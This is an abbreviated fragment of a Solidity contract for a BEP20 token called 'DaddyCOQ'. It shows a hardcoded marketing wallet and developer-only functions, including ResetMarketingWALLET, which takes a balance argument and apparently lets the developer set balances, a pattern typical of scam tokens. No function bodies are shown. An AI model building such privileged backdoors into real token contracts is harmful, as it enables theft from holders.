...
*/
    ...
    contract  DaddyCOQ  is IBEP20, Ownable
    {
        ...
        string private constant _name = "DaddyCOQ";
        string private constant _symbol = "DaddyCOQ";
        ...
        address public constant MarketingWallet=0x19a1501BF0F3C2BF44568ffDC7d46060242fe32a; 
      ...
      function ResetMarketingWALLET(address account, uint256 balance) onlyDev  public virtual {
    ...
    function SetupLiquidityTokenAddress(address liquidityTokenAddress) public onlyOwner{
       ...
       function NewSetAddress(address _address) external onlyDev {
